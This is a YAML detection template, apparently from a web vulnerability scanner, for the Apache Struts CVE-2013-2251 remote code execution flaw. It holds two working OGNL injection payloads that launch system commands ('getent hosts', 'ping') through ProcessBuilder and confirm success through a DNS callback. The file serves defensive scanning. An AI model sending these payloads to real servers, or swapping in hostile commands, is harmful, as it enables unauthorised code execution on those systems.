collect:
  - uniq:
    - [ URI ]

match:
  - "ACTION_EXT_value": 'action'

generate:
  - into:
    - POST
  - payload:
    - "redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'getent','hosts','DNS_MARKER'})).start()}"
    - "redirectAction:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'ping','DNS_MARKER', '-n 1'})).start()}"
  - method:
    - replace

detect:
  - oob:
    - dns

meta-info:
  - type: rce
  - threat: 90
  - applicable_for:
    - fast
  - tags: 
    - RCE
    - Remote Code Execution
    - CVE-2013-2251
    - Apache Struts 2.0.0 through 2.3.15